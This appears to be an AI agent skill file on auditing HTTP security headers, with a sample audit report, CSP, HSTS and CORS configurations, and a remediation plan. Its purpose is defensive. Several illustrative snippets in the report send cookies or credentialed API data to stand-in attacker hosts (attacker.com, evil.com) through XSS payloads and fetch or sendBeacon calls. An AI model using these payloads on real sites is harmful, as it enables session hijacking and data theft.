---
name: security-headers
description: Validate and implement HTTP security headers to protect web applications.
---

# Security Headers Skill

Validate and implement HTTP security headers to protect web applications.

## Instructions

You are a web security headers expert. When invoked:

1. **Analyze Security Headers**:
   - Scan HTTP response headers
   - Identify missing security headers
   - Check header configurations
   - Detect misconfigurations
   - Validate CSP policies
   - Review CORS settings

2. **Security Assessment**:
   - Rate header security posture
   - Identify vulnerabilities
   - Check compliance with best practices
   - Test for bypass techniques
   - Validate header syntax

3. **Attack Prevention**:
   - XSS (Cross-Site Scripting)
   - Clickjacking
   - MIME-sniffing attacks
   - Man-in-the-Middle attacks
   - Information disclosure
   - Cache poisoning
   - Protocol downgrade attacks

4. **Compliance Checking**:
   - OWASP recommendations
   - Security standards (PCI-DSS, HIPAA)
   - Browser compatibility
   - Performance impact assessment

5. **Generate Report**: Provide comprehensive header analysis with implementation guidance

## Critical Security Headers

### Content Security Policy (CSP)
**Purpose**: Prevent XSS attacks by controlling resource loading

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self' https://fonts.googleapis.com; connect-src 'self' https://api.example.com; frame-ancestors 'none'; base-uri 'self'; form-action 'self'
```

**Directives**:
- `default-src`: Fallback for other directives
- `script-src`: JavaScript sources
- `style-src`: CSS sources
- `img-src`: Image sources
- `font-src`: Font sources
- `connect-src`: AJAX, WebSocket, EventSource
- `frame-src`: Iframe sources
- `frame-ancestors`: Pages that can embed this page
- `base-uri`: Base tag URLs
- `form-action`: Form submission targets

### Strict-Transport-Security (HSTS)
**Purpose**: Force HTTPS connections

```http
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

**Parameters**:
- `max-age`: Duration in seconds (recommended: 31536000 = 1 year)
- `includeSubDomains`: Apply to all subdomains
- `preload`: Include in browser preload lists

### X-Frame-Options
**Purpose**: Prevent clickjacking attacks

```http
X-Frame-Options: DENY
```

**Values**:
- `DENY`: Cannot be framed at all
- `SAMEORIGIN`: Can only be framed by same origin
- `ALLOW-FROM uri`: Deprecated, use CSP instead

### X-Content-Type-Options
**Purpose**: Prevent MIME-sniffing attacks

```http
X-Content-Type-Options: nosniff
```

### X-XSS-Protection
**Purpose**: Enable browser XSS filter (legacy, CSP is preferred)

```http
X-XSS-Protection: 1; mode=block
```

**Note**: Deprecated in favor of Content-Security-Policy

### Referrer-Policy
**Purpose**: Control referrer information

```http
Referrer-Policy: strict-origin-when-cross-origin
```

**Values**:
- `no-referrer`: Never send referrer
- `no-referrer-when-downgrade`: Default behavior
- `origin`: Send only origin
- `origin-when-cross-origin`: Full URL for same-origin
- `same-origin`: Only for same-origin requests
- `strict-origin`: Origin only, not on HTTPS→HTTP
- `strict-origin-when-cross-origin`: Recommended
- `unsafe-url`: Always send full URL (not recommended)

### Permissions-Policy
**Purpose**: Control browser features and APIs

```http
Permissions-Policy: geolocation=(), microphone=(), camera=(), payment=(), usb=(), magnetometer=(), gyroscope=(), accelerometer=()
```

### Cross-Origin Headers

#### CORP (Cross-Origin-Resource-Policy)
```http
Cross-Origin-Resource-Policy: same-origin
```

#### COEP (Cross-Origin-Embedder-Policy)
```http
Cross-Origin-Embedder-Policy: require-corp
```

#### COOP (Cross-Origin-Opener-Policy)
```http
Cross-Origin-Opener-Policy: same-origin
```

## Usage Examples

```
@security-headers
@security-headers https://example.com
@security-headers --check-csp
@security-headers --report
@security-headers --fix
@security-headers localhost:3000
```

## Header Scanning Commands

### Using curl
```bash
# Check all headers
curl -I https://example.com

# Check specific header
curl -I https://example.com | grep -i "content-security-policy"

# Follow redirects
curl -IL https://example.com

# Detailed headers
curl -v https://example.com 2>&1 | grep -i "^< "
```

### Using online tools
```bash
# Mozilla Observatory
curl "https://http-observatory.security.mozilla.org/api/v1/analyze?host=example.com"

# Security Headers
curl "https://securityheaders.com/?q=example.com&followRedirects=on"
```

### Using custom scripts
```bash
# Node.js header checker
node check-headers.js https://example.com

# Python header scanner
python3 scan_headers.py https://example.com
```

## Security Headers Report Format

```markdown
# Security Headers Analysis Report

**Website**: https://example.com
**Scan Date**: 2024-01-15 14:30:00 UTC
**Scanner**: Security Headers Analyzer v2.0

---

## Overall Security Score

**Grade**: C
**Score**: 62/100

🔴 Critical Issues: 2
🟠 High Priority: 3
🟡 Medium Priority: 4
🟢 Low Priority: 2

**Status**: ⚠️  NEEDS IMPROVEMENT

---

## Executive Summary

Your website is vulnerable to several common attacks due to missing or misconfigured security headers. The most critical issues are:

1. Missing Content-Security-Policy (enables XSS attacks)
2. Missing Strict-Transport-Security (vulnerable to MITM)
3. Permissive CORS configuration

**Immediate Actions Required**: Implement CSP and HSTS headers

---

## Header Analysis

### ✅ Headers Present (3)

#### X-Content-Type-Options: nosniff
**Status**: ✅ Correctly configured
**Grade**: A+
**Purpose**: Prevents MIME-sniffing attacks

```http
X-Content-Type-Options: nosniff
```

**Impact**: Prevents browsers from interpreting files as different MIME types
**Recommendation**: Keep this header

---

#### X-Frame-Options: DENY
**Status**: ✅ Correctly configured
**Grade**: A+
**Purpose**: Prevents clickjacking attacks

```http
X-Frame-Options: DENY
```

**Impact**: Prevents page from being embedded in frames
**Recommendation**: Keep this header
**Note**: Consider migrating to CSP frame-ancestors directive

---

#### Referrer-Policy: strict-origin-when-cross-origin
**Status**: ✅ Good configuration
**Grade**: A
**Purpose**: Controls referrer information leakage

```http
Referrer-Policy: strict-origin-when-cross-origin
```

**Impact**: Balances privacy and functionality
**Recommendation**: Optimal setting for most applications

---

### ❌ Missing Headers (5)

#### Content-Security-Policy
**Status**: 🔴 MISSING - CRITICAL
**Grade**: F
**Risk**: High - XSS attacks possible

**Current**: Not set
**Impact**:
- No protection against XSS attacks
- JavaScript can be injected from any source
- Inline scripts execute without restriction
- Third-party resources load without control

**Vulnerability Example**:
```html
<!-- Attacker can inject: -->
<script>
  // Steal cookies
  fetch('https://attacker.com/steal?cookie=' + document.cookie);

  // Hijack session
  window.location = 'https://attacker.com/phishing';
</script>
```

**Recommended Configuration**:
```http
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{random}'; style-src 'self' 'unsafe-inline'; img-src 'self' https: data:; font-src 'self'; connect-src 'self' https://api.example.com; frame-ancestors 'none'; base-uri 'self'; form-action 'self'; upgrade-insecure-requests
```

**Implementation**:

**Express.js**:
```javascript
const helmet = require('helmet');

app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'", "'nonce-{random}'"],
    styleSrc: ["'self'", "'unsafe-inline'"],
    imgSrc: ["'self'", "https:", "data:"],
    fontSrc: ["'self'"],
    connectSrc: ["'self'", "https://api.example.com"],
    frameAncestors: ["'none'"],
    baseUri: ["'self'"],
    formAction: ["'self'"],
    upgradeInsecureRequests: []
  }
}));
```

**Nginx**:
```nginx
add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'nonce-{random}'; style-src 'self' 'unsafe-inline'; img-src 'self' https: data:; font-src 'self'; connect-src 'self' https://api.example.com; frame-ancestors 'none'; base-uri 'self'; form-action 'self'; upgrade-insecure-requests" always;
```

**Apache**:
```apache
Header always set Content-Security-Policy "default-src 'self'; script-src 'self' 'nonce-{random}'; style-src 'self' 'unsafe-inline'; img-src 'self' https: data:; font-src 'self'; connect-src 'self' https://api.example.com; frame-ancestors 'none'; base-uri 'self'; form-action 'self'; upgrade-insecure-requests"
```

**Testing**:
```javascript
// Use CSP in report-only mode first
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report

// Backend endpoint to collect violations
app.post('/csp-report', (req, res) => {
  console.log('CSP Violation:', req.body);
  res.status(204).end();
});
```

**Priority**: P0 - Implement immediately

---

#### Strict-Transport-Security
**Status**: 🔴 MISSING - CRITICAL
**Grade**: F
**Risk**: High - MITM attacks possible

**Current**: Not set
**Impact**:
- No forced HTTPS
- Vulnerable to SSL stripping attacks
- Man-in-the-Middle attacks possible
- Session hijacking risk

**Vulnerability Example**:
```
User types: http://example.com
→ Attacker intercepts unencrypted initial request
→ Serves malicious page or steals credentials
→ Even if site redirects to HTTPS, initial request is vulnerable
```

**Recommended Configuration**:
```http
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

**Implementation**:

**Express.js**:
```javascript
app.use(helmet.hsts({
  maxAge: 31536000,
  includeSubDomains: true,
  preload: true
}));
```

**Nginx**:
```nginx
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
```

**Apache**:
```apache
Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains; preload"
```

**Prerequisites**:
1. ✅ HTTPS fully working on all subdomains
2. ✅ Valid SSL certificate
3. ✅ No HTTP-only subdomains you want to keep

**HSTS Preload Submission**:
```
1. Visit: https://hstspreload.org/
2. Ensure max-age >= 31536000 (1 year)
3. Include includeSubDomains directive
4. Include preload directive
5. Submit domain for preload list
```

**Warning**:
- Start with short max-age (e.g., 300) for testing
- Increase gradually: 300 → 86400 → 2592000 → 31536000
- Preloading is difficult to undo

**Priority**: P0 - Implement immediately

---

#### Permissions-Policy
**Status**: 🟠 MISSING - HIGH
**Grade**: D
**Risk**: Medium - Unnecessary API access

**Current**: Not set
**Impact**:
- No control over browser features
- Third-party scripts can access camera, microphone, location
- Potential privacy violations
- Unexpected resource usage

**Recommended Configuration**:
```http
Permissions-Policy: geolocation=(), microphone=(), camera=(), payment=(), usb=(), magnetometer=(), gyroscope=(), accelerometer=(), interest-cohort=()
```

**Implementation**:

**Express.js**:
```javascript
app.use((req, res, next) => {
  res.setHeader('Permissions-Policy',
    'geolocation=(), microphone=(), camera=(), payment=(), usb=(), magnetometer=(), gyroscope=(), accelerometer=(), interest-cohort=()'
  );
  next();
});
```

**Nginx**:
```nginx
add_header Permissions-Policy "geolocation=(), microphone=(), camera=(), payment=(), usb=(), magnetometer=(), gyroscope=(), accelerometer=(), interest-cohort=()" always;
```

**Custom Permissions** (if you need specific features):
```http
# Allow geolocation for your domain only
Permissions-Policy: geolocation=(self), microphone=(), camera=()

# Allow camera for specific domain
Permissions-Policy: camera=(self "https://trusted-video.com"), microphone=()
```

**Priority**: P1 - Implement within 7 days

---

#### Cross-Origin-Resource-Policy
**Status**: 🟡 MISSING - MEDIUM
**Grade**: C

**Recommended Configuration**:
```http
Cross-Origin-Resource-Policy: same-origin
```

**Implementation**:
```javascript
app.use((req, res, next) => {
  res.setHeader('Cross-Origin-Resource-Policy', 'same-origin');
  next();
});
```

**Values**:
- `same-origin`: Only same-origin requests (recommended)
- `same-site`: Same-site requests allowed
- `cross-origin`: All origins allowed

**Priority**: P2 - Implement within 30 days

---

#### Cross-Origin-Embedder-Policy
**Status**: 🟡 MISSING - MEDIUM
**Grade**: C

**Recommended Configuration**:
```http
Cross-Origin-Embedder-Policy: require-corp
```

**Priority**: P2 - Implement within 30 days

---

### ⚠️  Misconfigured Headers (2)

#### Access-Control-Allow-Origin: *
**Status**: 🔴 CRITICAL MISCONFIGURATION
**Grade**: F
**Risk**: High - Open CORS policy

**Current Configuration**:
```http
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

**Issue**:
This configuration is **dangerous** and **invalid**. Wildcard (*) cannot be used with credentials.

**Vulnerability**:
```javascript
// Any malicious site can make authenticated requests:
fetch('https://example.com/api/user/data', {
  credentials: 'include'  // Sends cookies
})
.then(res => res.json())
.then(data => {
  // Attacker steals user data
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify(data)
  });
});
```

**Correct Configuration**:
```javascript
// Express.js - Dynamic CORS
const allowedOrigins = [
  'https://app.example.com',
  'https://admin.example.com'
];

app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (allowedOrigins.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
  }
  next();
});
```

**Using CORS middleware**:
```javascript
const cors = require('cors');

app.use(cors({
  origin: function(origin, callback) {
    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  exposedHeaders: ['X-Total-Count'],
  maxAge: 600
}));
```

**Nginx**:
```nginx
set $cors_origin "";
if ($http_origin ~ "^https://(app|admin)\.example\.com$") {
    set $cors_origin $http_origin;
}

add_header Access-Control-Allow-Origin $cors_origin always;
add_header Access-Control-Allow-Credentials true always;
add_header Access-Control-Allow-Methods "GET, POST, PUT, DELETE" always;
add_header Access-Control-Allow-Headers "Content-Type, Authorization" always;
```

**Priority**: P0 - Fix immediately

---

#### X-XSS-Protection: 1; mode=block
**Status**: ⚠️  DEPRECATED
**Grade**: C

**Current Configuration**:
```http
X-XSS-Protection: 1; mode=block
```

**Issue**: This header is deprecated and can create security vulnerabilities in some browsers.

**Recommendation**: Remove this header and rely on Content-Security-Policy instead.

**Migration**:
```javascript
// Remove X-XSS-Protection
// Instead, implement strong CSP
app.use(helmet({
  xssFilter: false,  // Disable deprecated header
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"]
    }
  }
}));
```

**Priority**: P2 - Update configuration

---

## Security Grade Breakdown

| Category | Score | Grade |
|----------|-------|-------|
| XSS Protection | 20/30 | D |
| Clickjacking Protection | 10/10 | A+ |
| HTTPS Enforcement | 0/20 | F |
| Information Disclosure | 15/15 | A |
| CORS Configuration | 0/15 | F |
| Browser Features | 0/10 | F |
| **Overall** | **45/100** | **F** |

---

## Attack Vectors Still Possible

### 1. Cross-Site Scripting (XSS)
**Risk**: CRITICAL
**Reason**: No Content-Security-Policy

**Example Attack**:
```html
<!-- Stored XSS -->
<img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">

<!-- Reflected XSS -->
https://example.com/search?q=<script>alert(document.cookie)</script>
```

**Mitigation**: Implement strict CSP

---

### 2. Man-in-the-Middle (MITM)
**Risk**: CRITICAL
**Reason**: No HSTS header

**Example Attack**:
```
1. User connects to http://example.com (unencrypted)
2. Attacker intercepts and serves fake login page
3. User enters credentials
4. Attacker captures credentials
```

**Mitigation**: Implement HSTS with preload

---

### 3. Cross-Origin Data Theft
**Risk**: HIGH
**Reason**: Permissive CORS configuration

**Example Attack**:
```javascript
// From attacker.com:
fetch('https://example.com/api/sensitive-data', {
  credentials: 'include'
})
.then(r => r.json())
.then(data => {
  // Exfiltrate data
  navigator.sendBeacon('https://attacker.com/log', JSON.stringify(data));
});
```

**Mitigation**: Restrict CORS to trusted origins only

---

## Remediation Plan

### Phase 1: Critical (Immediate - 24 hours)

#### 1. Fix CORS Misconfiguration
```javascript
// Remove wildcard CORS
- Access-Control-Allow-Origin: *

// Implement origin whitelist
+ Access-Control-Allow-Origin: https://app.example.com
```

**Testing**:
```bash
# Test CORS from allowed origin
curl -H "Origin: https://app.example.com" \
     -I https://example.com/api/data

# Test CORS from disallowed origin (should fail)
curl -H "Origin: https://evil.com" \
     -I https://example.com/api/data
```

**Risk**: Medium (may break integrations)
**Estimated Time**: 2 hours

---

#### 2. Implement HSTS
```nginx
add_header Strict-Transport-Security "max-age=300" always;
```

**Testing Period**: 5 minutes (max-age=300)
**Full Implementation**: Increase to 31536000 after testing

**Testing**:
```bash
# Verify HSTS header
curl -I https://example.com | grep -i strict-transport-security

# Test forced HTTPS
curl -IL http://example.com
# Should redirect to https://
```

**Risk**: Low
**Estimated Time**: 1 hour

---

### Phase 2: High Priority (Within 7 days)

#### 3. Implement Content-Security-Policy

**Week 1: Report-Only Mode**
```http
Content-Security-Policy-Report-Only: default-src 'self'; script-src 'self'; report-uri /csp-report
```

**Monitor violations for 7 days**

**Week 2: Enforce Mode**
```http
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{random}'; ...
```

**Testing**:
```bash
# Check CSP header
curl -I https://example.com | grep -i content-security-policy

# Verify CSP effectiveness
# Open DevTools Console, check for CSP violations
```

**Risk**: High (may break functionality)
**Estimated Time**: 3-5 days (including testing)

---

#### 4. Add Permissions-Policy
```http
Permissions-Policy: geolocation=(), microphone=(), camera=()
```

**Risk**: Low
**Estimated Time**: 1 hour

---

### Phase 3: Medium Priority (Within 30 days)

#### 5. Implement Cross-Origin Headers
```http
Cross-Origin-Resource-Policy: same-origin
Cross-Origin-Embedder-Policy: require-corp
Cross-Origin-Opener-Policy: same-origin
```

**Risk**: Medium
**Estimated Time**: 2-3 days

---

#### 6. Remove Deprecated Headers
```javascript
// Remove X-XSS-Protection
- X-XSS-Protection: 1; mode=block
```

**Risk**: Low
**Estimated Time**: 30 minutes

---

## Implementation Code

### Complete Express.js Configuration
```javascript
const express = require('express');
const helmet = require('helmet');
const app = express();

// Generate nonce for CSP
app.use((req, res, next) => {
  res.locals.nonce = require('crypto').randomBytes(16).toString('base64');
  next();
});

// Security headers
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", (req, res) => `'nonce-${res.locals.nonce}'`],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "https:", "data:"],
      fontSrc: ["'self'"],
      connectSrc: ["'self'", "https://api.example.com"],
      frameAncestors: ["'none'"],
      baseUri: ["'self'"],
      formAction: ["'self'"],
      upgradeInsecureRequests: []
    }
  },
  hsts: {
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true
  },
  frameguard: {
    action: 'deny'
  },
  noSniff: true,
  xssFilter: false,  // Deprecated, use CSP
  referrerPolicy: {
    policy: 'strict-origin-when-cross-origin'
  },
  crossOriginEmbedderPolicy: true,
  crossOriginOpenerPolicy: { policy: 'same-origin' },
  crossOriginResourcePolicy: { policy: 'same-origin' }
}));

// Permissions Policy
app.use((req, res, next) => {
  res.setHeader('Permissions-Policy',
    'geolocation=(), microphone=(), camera=(), payment=(), usb=()'
  );
  next();
});

// CORS configuration
const allowedOrigins = ['https://app.example.com', 'https://admin.example.com'];
app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (allowedOrigins.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  }
  next();
});

// CSP violation reporting
app.post('/csp-report', express.json({ type: 'application/csp-report' }), (req, res) => {
  console.log('CSP Violation:', req.body);
  res.status(204).end();
});

app.listen(3000);
```

### Complete Nginx Configuration
```nginx
server {
    listen 443 ssl http2;
    server_name example.com;

    # SSL configuration
    ssl_certificate /path/to/cert.pem;
    ssl_certificate_key /path/to/key.pem;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers HIGH:!aNULL:!MD5;

    # Security Headers
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
    add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'nonce-{random}'; style-src 'self' 'unsafe-inline'; img-src 'self' https: data:; font-src 'self'; connect-src 'self' https://api.example.com; frame-ancestors 'none'; base-uri 'self'; form-action 'self'; upgrade-insecure-requests" always;
    add_header X-Frame-Options "DENY" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
    add_header Permissions-Policy "geolocation=(), microphone=(), camera=(), payment=(), usb=()" always;
    add_header Cross-Origin-Resource-Policy "same-origin" always;
    add_header Cross-Origin-Embedder-Policy "require-corp" always;
    add_header Cross-Origin-Opener-Policy "same-origin" always;

    # CORS
    set $cors_origin "";
    if ($http_origin ~ "^https://(app|admin)\.example\.com$") {
        set $cors_origin $http_origin;
    }
    add_header Access-Control-Allow-Origin $cors_origin always;
    add_header Access-Control-Allow-Credentials true always;

    location / {
        proxy_pass http://localhost:3000;
    }
}

# HTTP to HTTPS redirect
server {
    listen 80;
    server_name example.com;
    return 301 https://$server_name$request_uri;
}
```

---

## Testing Checklist

### Automated Testing
- [ ] Run header scanner tool
- [ ] Check Mozilla Observatory score
- [ ] Verify SecurityHeaders.com grade
- [ ] Test with browser DevTools
- [ ] Automated tests in CI/CD

### Manual Testing
- [ ] Verify HTTPS redirect
- [ ] Test CSP violations in console
- [ ] Check frame embedding
- [ ] Test CORS from allowed/disallowed origins
- [ ] Verify API access restrictions

### Browser Compatibility
- [ ] Chrome/Edge (latest)
- [ ] Firefox (latest)
- [ ] Safari (latest)
- [ ] Mobile browsers

---

## Monitoring and Maintenance

### CSP Violation Monitoring
```javascript
// Log violations
app.post('/csp-report', (req, res) => {
  const violation = req.body['csp-report'];
  logger.warn('CSP Violation', {
    blockedURI: violation['blocked-uri'],
    violatedDirective: violation['violated-directive'],
    documentURI: violation['document-uri']
  });
  res.status(204).end();
});

// Alert on critical violations
if (violation['violated-directive'].includes('script-src')) {
  alertSecurityTeam(violation);
}
```

### Regular Audits
- Weekly: Automated header scanning
- Monthly: Manual security review
- Quarterly: Full security assessment
- After changes: Regression testing

---

## Best Practices

### Header Implementation
- ✅ Use security header middleware (helmet, etc.)
- ✅ Apply headers at infrastructure level (CDN, load balancer)
- ✅ Test in staging before production
- ✅ Start with report-only mode for CSP
- ✅ Monitor violations and adjust policies
- ✅ Document header configurations

### CSP Best Practices
- ✅ Start strict, loosen as needed
- ✅ Use nonces or hashes for inline scripts
- ✅ Avoid 'unsafe-inline' and 'unsafe-eval'
- ✅ Use report-uri or report-to
- ✅ Regularly review and update policies

### HSTS Best Practices
- ✅ Start with short max-age for testing
- ✅ Ensure HTTPS works on all subdomains before includeSubDomains
- ✅ Submit to HSTS preload list
- ✅ Plan for long-term HTTPS support

---

## Summary

**Current Grade**: F (45/100)
**Target Grade**: A+ (95+/100)
**Estimated Effort**: 2-3 weeks
**Priority**: HIGH - Critical vulnerabilities present

**Immediate Actions**:
1. Fix CORS misconfiguration (today)
2. Implement HSTS (today)
3. Deploy CSP in report-only mode (this week)
4. Enforce CSP (next week)

**Expected Grade After Fixes**: A (90+/100)
```

## Notes

- Test headers in staging first
- Use report-only mode for CSP initially
- Monitor CSP violations before enforcing
- Balance security with functionality
- Keep headers updated with best practices
- Regular security audits recommended
- Document all header configurations
- Train team on header security
- Use automated tools for continuous monitoring
- Review headers after major changes
